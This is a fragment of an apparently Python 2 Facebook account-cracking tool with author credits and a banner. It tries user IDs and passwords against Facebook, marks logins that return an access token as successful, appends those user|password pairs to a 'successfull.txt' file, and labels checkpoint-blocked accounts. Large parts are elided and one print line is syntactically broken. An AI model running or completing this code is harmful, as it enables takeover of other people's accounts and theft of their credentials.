#Tools Created By Raisul Islam
#https://www.facebook.com/abal.not.allow.dada.is.back.R
...
print("\033[0;91mThis Tool's Free By Mrak Rakib")
...
def menu():
    ...
    print ('logo')
    print ''
    print '\033[0;93mAUTHOR   :  Mark Rakib
    print '\033[0;94mFACEBOOK :  
    print '\033[0;96mGITHUB   : Mark-Rakib404cyber'
    print ''
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[DaDa-done]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Raisul-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
    ...
    os.system('python2 raisul6-digit.py')
